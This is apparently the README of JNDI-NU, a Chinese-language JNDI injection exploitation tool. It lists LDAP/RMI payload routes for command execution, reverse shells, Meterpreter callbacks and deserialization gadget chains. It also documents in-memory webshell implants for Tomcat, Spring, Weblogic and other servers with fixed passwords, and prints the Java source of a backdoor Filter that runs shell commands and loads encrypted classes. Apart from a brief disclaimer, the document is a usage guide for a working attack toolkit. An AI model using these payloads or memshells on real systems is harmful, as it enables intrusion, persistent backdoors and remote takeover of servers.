# 👻JNDI-NU

一款用于 ```JNDI注入``` 利用的工具，大量参考/引用了 ```Rogue JNDI``` 项目的代码，支持直接```植入内存shell```，并集成了常见的```bypass 高版本JDK```的方式，适用于与自动化工具配合使用。

对大佬的项目https://github.com/WhiteHSBG/JNDIExploit 做了一点点些微的优化，加了CC6，RMI，还对回显做了一点优化。

后面学习到了新的链子，也会往里面加进去。

---

## 👮免责声明

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

## 👾下载

[下载点此处](https://github.com/nuxl1r/JNDI-NU/releases)

## 😈使用说明

使用 ```java -jar JNDI-NU.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JNDI-NU.jar [options]
  Options:
  * -i, --ip       Local ip address
    -rl, --rmiPort rmi bind port (default: 10990)
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -c, --command  rmi gadgets System Command
    -py, --python  Python System Command ex: python3  python2 ...
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式
```
Supported LADP Queries：
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
    ldap://0.0.0.0:1389/Basic/Command/[cmd]
    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Basic/TomcatEcho
    ldap://0.0.0.0:1389/Basic/SpringEcho
    ldap://0.0.0.0:1389/Basic/WeblogicEcho
    ldap://0.0.0.0:1389/Basic/TomcatMemshell1
    ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]
    ldap://0.0.0.0:1389/Basic/TomcatMemshell3  /ateam  pass1024
    ldap://0.0.0.0:1389/Basic/GodzillaMemshell /bteam.ico pass1024
    ldap://0.0.0.0:1389/Basic/JettyMemshell
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
    ldap://0.0.0.0:1389/Basic/JBossMemshell
    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
    ldap://0.0.0.0:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections4/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]
    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024
    ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell /bteam.ico pass1024
    ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell
    ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp

[+] GroovyBypass Queries
    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]
    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
    
    以上可以将 <ldap://> 替换为 <rmi://>
```
* 目前支持的所有 ```PayloadType``` 为
  * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
  * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
  * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
  * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```WeblogicEcho```: 用于在中间件为 ```Weblogic``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```TomcatMemshell1```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```TomcatMemshell2```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```, 使用时需要添加额外的```HTTP Header``` ```Shell: true```, **推荐**使用此方式
  * ```SpringMemshell```: 用于植入```Spring内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
  * ```JettyMemshell```: 用于植入```Jetty内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```JBossMemshell```: 用于植入```JBoss内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
* 目前支持的所有 ```GadgetType``` 为
  * ```URLDNS```
  * ```CommonsBeanutils1```  
  * ```CommonsBeanutils2```
  * ```CommonsCollections1```
  * ```CommonsCollections1_1```
  * ```CommonsCollections2```
  * ```CommonsCollections3```
  * ```CommonsCollections4```
  * ```CommonsCollections5```
  * ```CommonsCollections6```
  * ```CommonsCollections7```
  * ```CommonsCollectionsK1```
  * ```CommonsCollectionsK2```
  * ```CommonsCollectionsK3```
  * ```CommonsCollectionsK4```
  * ```C3P0```
  * ```Jdk7u21```
  * ```Jre8u20```
  * ```CVE_2020_2551```
  * ```CVE_2020_2883```
* ```WebsphereBypass``` 中的 3 个动作：
  * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
  * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
  * ```rce```：加载已上传至目标服务器临时目录的```jar包```，从而达到远程代码执行的效果（这一步本地未复现成功，抛```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```异常，有复现成功的小伙伴麻烦指导下）

## 🥎```内存shell```说明
* 采用动态添加 ```Filter/Controller```的方式，并将添加的```Filter```移动至```FilterChain```的第一位
* ```内存shell``` 的兼容性测试结果请参考 [memshell](https://github.com/feihong-cs/memShell) 项目
* ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```
* ```TomcatMemshell1和TomcatMemshell2``` 的访问方式需要修改```冰蝎```客户端（请参考 [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) 的方式二自行修改），并在访问时需要添加 ```X-Options-Ai``` 头部，密码为```rebeyond```
## 🏀```内存shell```说明2
* ```TomcatMemshell3``` 可直接使用冰蝎3客户端连接 推荐使用此payload
* ```GodzillaMemshell``` 可直接使用哥斯拉客户端连接 推荐使用此payload

TomcatMemshell1和TomcatMemshell2植入的 Filter 代码如下：
```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String k;
        Cipher cipher;
        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
            k = servletRequest.getParameter("pass");
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        } else if (((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null) {
            try {
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                    k = "e45e329feb5d925b";
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, servletRequest, servletResponse);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }
```
---



## 🏉添加内容

添加内容是为了支持SpringBootExploit工具，是定制版的服务端。

1. 启动方式：java -jar  JNDIExploit-1.3-SNAPSHOT.jar 默认绑定127.0.0.1 LDAP 绑定 1389 HTTP Server 绑定3456
2. 根目录下BehinderFilter.class是内存马 /ateam 密码是ateamnb
3. data/behinder3.jar 是为了支持SnakYaml RCE
4. 添加HTTPServer处理更多的请求，为了更好支持SpringBootExploit工具
5. 将文件放在data目录下，通过HTTPServer可以访问文件内容如同python的HTTPServer

## 🥋添加内容2

新增哥斯拉内存马

- 支持引用类远程加载方式打入（Basic路由）
- 支持本地工厂类方式打入 （TomcatBypass路由）

哥斯拉客户端配置：
```
密码：pass1024
密钥：key
有效载荷：JavaDynamicPayload
加密器：JAVA_AES_BASE64
```

修复之前版本中的一些问题，冰蝎内存马现已直接可用冰蝎客户端直连

**新增msf上线支持**

- 支持tomcatBypass路由直接上线msf：

```
  使用msf的java/meterpreter/reverse_tcp开启监听
  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
  ```


---

## 🏓TODO

1. 本地ClassPath反序列化漏洞利用方式
2. 支持自定义内存马密码
3. 内存马模块改一下

---

## 🐲建议

建议使用Java11 ，不推荐Java17，Java17可能出现BUG。

 ## 📷参考
 * https://github.com/veracode-research/rogue-jndi
 * https://github.com/welk1n/JNDI-Injection-Exploit
 * https://github.com/welk1n/JNDI-Injection-Bypass

